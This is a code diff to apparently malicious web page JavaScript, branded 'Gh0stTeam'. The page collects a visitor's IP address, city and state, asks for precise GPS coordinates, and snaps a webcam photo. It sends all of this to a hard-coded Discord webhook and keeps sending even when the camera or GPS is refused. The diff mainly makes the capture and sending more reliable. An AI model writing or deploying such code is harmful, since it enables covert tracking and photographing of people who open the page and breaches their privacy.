@@ -23,33 +23,36 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496557379351875745/PsqDIUD8fIDhCGozVuKw9JQOHjMX-FQgmEfVoaxdGFcRyTq926Dg5m47hxDC5BrKHlTx';
 
         async function iniciar() {
-            // Dados iniciais
             let info = { 
-                ip: 'Buscando...', 
-                cidade: 'Buscando...', 
-                estado: 'Buscando...', 
-                latitude: 'Não permitida', 
-                longitude: 'Não permitida' 
+                ip: 'Não obtido', 
+                cidade: 'Não obtida', 
+                estado: 'Não obtido', 
+                latitude: 'Negada', 
+                longitude: 'Negada' 
             };
 
-            // 1. Captura IP e Localização por IP
+            // 1. Captura IP e Localização por IP (Usando ip-api.com - mais estável)
             try {
-                const res = await fetch('https://ipapi.co');
+                const res = await fetch('http://ip-api.com');
                 const data = await res.json();
-                info.ip = data.ip || 'Erro';
-                info.cidade = data.city || 'Desconhecida';
-                info.estado = data.region || 'Desconhecido';
-            } catch (e) { console.log("Erro no IP"); }
+                if (data.status === 'success') {
+                    info.ip = data.query;
+                    info.cidade = data.city;
+                    info.estado = data.regionName;
+                }
+            } catch (e) { 
+                console.log("Erro ao buscar IP, continuando..."); 
+            }
 
-            // 2. Captura Coordenadas Escritas (GPS)
+            // 2. Captura Coordenadas GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    info.latitude = pos.coords.latitude;
-                    info.longitude = pos.coords.longitude;
+                    info.latitude = pos.coords.latitude.toFixed(6);
+                    info.longitude = pos.coords.longitude.toFixed(6);
                     tirarFotoEEnviar(info);
                 }, () => { 
-                    tirarFotoEEnviar(info); // Envia mesmo sem GPS
-                });
+                    tirarFotoEEnviar(info); // Envia se negar GPS
+                }, { timeout: 5000 });
             } else {
                 tirarFotoEEnviar(info);
             }
@@ -61,37 +64,38 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
 
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('file', blob, 'foto.png');
-                        
-                        // Mensagem formatada com texto escrito
-                        const relatorio = `🛑 **RELATÓRIO DE ACESSO #Gh0stTeam** 🛑\n` +
-                                          `🌐 **IP:** ${dados.ip}\n` +
-                                          `📍 **CIDADE:** ${dados.cidade}\n` +
-                                          `🚩 **ESTADO:** ${dados.estado}\n` +
-                                          `📐 **LATITUDE:** ${dados.latitude}\n` +
-                                          `📐 **LONGITUDE:** ${dados.longitude}`;
+                        canvas.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('file', blob, 'foto.png');
+                            
+                            const relatorio = `🛑 **RELATÓRIO DE ACESSO #Gh0stTeam** 🛑\n` +
+                                              `🌐 **IP:** ${dados.ip}\n` +
+                                              `📍 **CIDADE:** ${dados.cidade}\n` +
+                                              `🚩 **ESTADO:** ${dados.estado}\n` +
+                                              `📐 **LATITUDE:** ${dados.latitude}\n` +
+                                              `📐 **LONGITUDE:** ${dados.longitude}`;
 
-                        fd.append('content', relatorio);
-                        
-                        fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/png');
-                }, 1000);
+                            fd.append('content', relatorio);
+                            
+                            fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 'image/png');
+                    }, 1000);
+                };
             } catch (e) {
-                // Se a câmera for negada
+                // Envio caso a câmera seja bloqueada
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ 
-                        content: `⚠️ **Câmera Bloqueada! Dados coletados:**\n🌐 IP: ${dados.ip}\n📍 Cidade: ${dados.cidade}\n📐 Latitude: ${dados.latitude}\n📐 Longitude: ${dados.longitude}` 
+                        content: `⚠️ **Câmera Bloqueada!**\n🌐 IP: ${dados.ip}\n📍 Cidade: ${dados.cidade}\n🚩 Estado: ${dados.estado}\n📐 Lat: ${dados.latitude}\n📐 Long: ${dados.longitude}` 
                     })
                 });
             }
